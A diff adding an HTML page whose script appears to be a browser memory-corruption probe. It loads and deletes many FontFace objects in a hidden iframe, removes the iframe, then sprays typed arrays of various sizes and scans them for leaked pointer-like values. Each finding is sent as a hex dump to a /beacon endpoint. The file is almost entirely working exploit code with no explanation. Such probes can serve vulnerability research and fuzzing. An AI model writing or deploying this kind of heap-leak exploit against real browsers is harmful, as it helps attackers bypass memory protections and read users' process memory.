@@ -1,0 +1,58 @@
+<!doctype html><meta charset="utf-8"><title>f16c</title><body><div id="host"></div><script>
+function b(m){var x=new XMLHttpRequest();x.open('GET','/beacon/F16C-'+m,false);try{x.send()}catch(e){}}
+function hex8(u,o){var s='';for(var i=0;i<8;i++){s+=('0'+u[o+i].toString(16)).slice(-2)}return s}
+function q(ms){return new Promise(function(r){setTimeout(r,ms)})}
+function qword(u,o){
+  var lo=u[o]|(u[o+1]<<8)|(u[o+2]<<16)|(u[o+3]<<24);
+  var hi=(u[o+4]|(u[o+5]<<8)|(u[o+6]<<16)|(u[o+7]<<24))>>>0;
+  return [lo>>>0,hi];
+}
+(async function(){
+  b('START');
+  var host=document.getElementById('host');
+  var ifr=document.createElement('iframe');
+  ifr.style.display='none';
+  host.appendChild(ifr);
+  var w=ifr.contentWindow, d=w.document;
+  d.open(); d.write('<!doctype html><body>'); d.close();
+  b('IFRAME-OK');
+  var ff=w.FontFace, fs=d.fonts;
+  var faces=[];
+  for (var i=0;i<200;i++){ var f=new ff('g'+i,'local("Helvetica")'); fs.add(f); faces.push(f); }
+  b('FACES-'+faces.length+'-fs'+d.fonts.size);
+  var pr=[];
+  for (var i=0;i<faces.length;i++) pr.push(faces[i].load().then(function(){return 1},function(){return 0}));
+  var st=await Promise.all(pr);
+  b('LOADED-'+st.reduce(function(a,c){return a+c},0));
+  for (var i=0;i<faces.length;i++) fs.delete(faces[i]);
+  faces.length=0; faces=null;
+  await q(60);
+  host.removeChild(ifr);
+  ifr=null; w=null; d=null;
+  b('IFRAME-GONE');
+  var CLASSES=[48,64,80,96,112,128,144,160,176,192,224,256,320,384,512];
+  var bufs=[];
+  for (var c=0;c<CLASSES.length;c++){
+    var k=CLASSES[c], arr=[];
+    for (var j=0;j<32;j++) arr.push(new Uint8Array(k));
+    bufs.push([k,arr]);
+  }
+  b('SPRAYED');
+  var hits=0;
+  for (var c=0;c<bufs.length;c++){
+    var k=bufs[c][0], arr=bufs[c][1];
+    for (var j=0;j<arr.length;j++){
+      var u=arr[j], nz=[];
+      for (var o=0;o+8<=k;o+=8){
+        var qq=qword(u,o);
+        if (qq[0]||qq[1]){
+          nz.push(o.toString(16)+':'+hex8(u,o));
+          if (qq[1]>0 && qq[1]<0x1000) hits++;
+        }
+      }
+      if (nz.length) b('HIT-s'+k+'-b'+j+'-n'+nz.length+'-'+nz.slice(0,5).join('_'));
+    }
+  }
+  b('DONE-ptrhits-'+hits);
+})();
+</script></body>
